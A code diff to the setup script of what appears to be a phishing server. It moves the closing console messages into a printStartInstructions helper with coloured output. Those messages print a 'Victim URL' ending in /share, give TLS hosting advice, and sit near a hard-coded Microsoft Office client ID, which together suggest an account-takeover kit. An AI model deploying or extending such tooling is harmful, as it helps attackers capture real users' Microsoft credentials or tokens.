@@ -25,6 +25,41 @@ const DEFAULT_CERT_STORE =
 const CLOUDFLARE_ORIGIN_CA =
   'https://developers.cloudflare.com/ssl/static/origin_ca_rsa_root.pem';
 
+function highlight(text) {
+  if (!process.stdout.isTTY) {
+    return text;
+  }
+  return `\x1b[1m\x1b[92m${text}\x1b[0m`;
+}
+
+function printStartInstructions(config, tlsMode, hostname) {
+  const startCmd = config.testMode ? 'npm start' : 'sudo npm start';
+  const publicHost = config.tlsHostname || hostname;
+
+  console.log('\nSetup complete.');
+
+  if (publicHost) {
+    const scheme = config.testMode ? 'http' : 'https';
+    const port = config.testMode ? config.httpPort : config.httpsPort;
+    const defaultPort = config.testMode ? 80 : 443;
+    const portSuffix = port === defaultPort ? '' : `:${port}`;
+    console.log(`Victim URL (after start): ${scheme}://${publicHost}${portSuffix}/share`);
+  }
+
+  if (config.testMode) {
+    console.log(`Configured for HTTP on port ${config.httpPort}.`);
+  } else {
+    console.log(`Configured for HTTPS on port ${config.httpsPort}.`);
+    if (tlsMode === 'cloudflare-origin') {
+      console.log('Ensure Cloudflare SSL/TLS mode is Full (strict) for origin certificates.');
+    } else {
+      console.log('Ensure the DNS A record is grey cloud (DNS only) for Let\'s Encrypt to work in browsers.');
+    }
+  }
+
+  console.log(`\nStart the server:\n  ${highlight(startCmd)}\n`);
+}
+
 // Public Microsoft client ID (Office) — not published in OpenID discovery.
 const DEFAULT_MS_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
@@ -896,26 +931,7 @@ async function main() {
   writeConfigJson(config);
   updateServerJs(config);
 
-  console.log('\nSetup complete.');
-
-  const hostname = config.tlsHostname || domain;
-  if (hostname) {
-    const scheme = config.testMode ? 'http' : 'https';
-    const port = config.testMode ? config.httpPort : config.httpsPort;
-    const defaultPort = config.testMode ? 80 : 443;
-    const portSuffix = port === defaultPort ? '' : `:${port}`;
-    console.log(`Victim URL (after start): ${scheme}://${hostname}${portSuffix}/share`);
-  }
-
-  if (config.testMode) {
-    console.log(`Configured for HTTP on port ${config.httpPort}. Start with: npm start`);
-  } else if (tlsMode === 'cloudflare-origin') {
-    console.log(`Configured for HTTPS on port ${config.httpsPort}. Start with: sudo npm start`);
-    console.log('Ensure Cloudflare SSL/TLS mode is Full (strict) for origin certificates.');
-  } else {
-    console.log(`Configured for HTTPS on port ${config.httpsPort}. Start with: sudo npm start`);
-    console.log('Ensure the DNS A record is grey cloud (DNS only) for Let\'s Encrypt to work in browsers.');
-  }
+  printStartInstructions(config, tlsMode, domain);
 }
 
 function inferHostnameFromConfig(config, cliDomain) {
